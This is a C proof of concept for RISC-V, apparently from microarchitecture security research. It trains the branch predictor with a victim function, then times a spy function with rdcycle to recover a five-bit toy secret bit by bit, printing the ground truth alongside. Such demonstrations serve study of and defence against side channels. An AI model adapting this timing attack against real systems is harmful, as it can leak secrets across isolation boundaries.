// brad_v1_recover_by_faster.c
// BRAD-v1: differential probing and recovery by comparing mean_probe(1) vs mean_probe(0)
//
// Compile (cross or native RISC-V toolchain):
//   riscv64-linux-gnu-gcc -O2 -static -o brad_v1_recover_by_faster brad_v1_recover_by_faster.c
// Run pinned for best SNR:
//   taskset -c 0 ./brad_v1_recover_by_faster

#include <stdio.h>
#include <stdint.h>

#define SECRET_LEN 5
#define ATTACK_ROUNDS 40      /* number of rounds to repeat train+probe */
#define TRAINING_REPS 16      /* how many victim_f calls to train predictor each round */
#define PROBE_SAMPLES 400     /* number of spy probes per value (1 and 0) per round */

volatile uint8_t sec[SECRET_LEN] = {1,0,0,1,0};
volatile uint8_t array1[1] = {1};

/* tiny asymmetry in branch bodies to produce a measurable difference */
__attribute__((noinline))
void condBranch(uint8_t *addr) {
    if (*addr) {
        asm volatile("nop; nop; nop; nop");
    } else {
        asm volatile("addi t1, zero, 2; nop");
    }
}

__attribute__((noinline))
void victim_f(unsigned idx) {
    condBranch((uint8_t*)&sec[idx]);
}

__attribute__((noinline))
void spy_f(unsigned idx) {
    (void)idx;
    condBranch((uint8_t*)&array1[0]);
}

/* rdcycle read with fences to lower reordering noise */
static inline uint64_t rdcycle_serialized(void) {
    uint64_t v;
    asm volatile("fence iorw, iorw" ::: "memory");
    asm volatile("rdcycle %0" : "=r"(v));
    asm volatile("fence iorw, iorw" ::: "memory");
    return v;
}

/* measure spy for value v, probe_samples times, return total cycles */
static uint64_t measure_spy_total(uint8_t v, unsigned probe_samples) {
    uint64_t sum = 0;
    array1[0] = v;
    for (unsigned i = 0; i < probe_samples; ++i) {
        uint64_t t0 = rdcycle_serialized();
        spy_f(0);
        uint64_t t1 = rdcycle_serialized();
        sum += (t1 - t0);
    }
    return sum;
}

int main(void) {
    printf("BRAD-v1 recovery = which branch is faster (mean_probe(1) vs mean_probe(0))\n");
    printf("Parameters: ATTACK_ROUNDS=%d TRAINING_REPS=%d PROBE_SAMPLES=%d\n\n",
           ATTACK_ROUNDS, TRAINING_REPS, PROBE_SAMPLES);

    printf("Secret (ground truth): ");
    for (unsigned i=0;i<SECRET_LEN;i++) printf("%u ", sec[i]);
    printf("\n\n");

    for (unsigned idx = 0; idx < SECRET_LEN; ++idx) {
        uint64_t total_sum1 = 0; /* accumulated cycles for spy(1) across all rounds */
        uint64_t total_sum0 = 0; /* accumulated cycles for spy(0) across all rounds */

        for (unsigned round = 0; round < ATTACK_ROUNDS; ++round) {
            /* train predictor using the real secret */
            for (unsigned t = 0; t < TRAINING_REPS; ++t) {
                victim_f(idx);
            }

            /* measure spy(1) */
            uint64_t sum1 = measure_spy_total(1, PROBE_SAMPLES);
            /* measure spy(0) */
            uint64_t sum0 = measure_spy_total(0, PROBE_SAMPLES);

            total_sum1 += sum1;
            total_sum0 += sum0;
        }

        /* compute mean cycles per single probe (i.e., per spy_f invocation) */
        double mean1 = (double)total_sum1 / (double)(ATTACK_ROUNDS * PROBE_SAMPLES);
        double mean0 = (double)total_sum0 / (double)(ATTACK_ROUNDS * PROBE_SAMPLES);

        /* recovered bit: whichever mean is faster */
        int recovered = (mean1 < mean0) ? 1 : 0;

        printf("Index %u: mean_probe(1)=%.3f cycles mean_probe(0)=%.3f cycles => recovered=%d (actual=%u)\n",
               idx, mean1, mean0, recovered, sec[idx]);
    }

    return 0;
}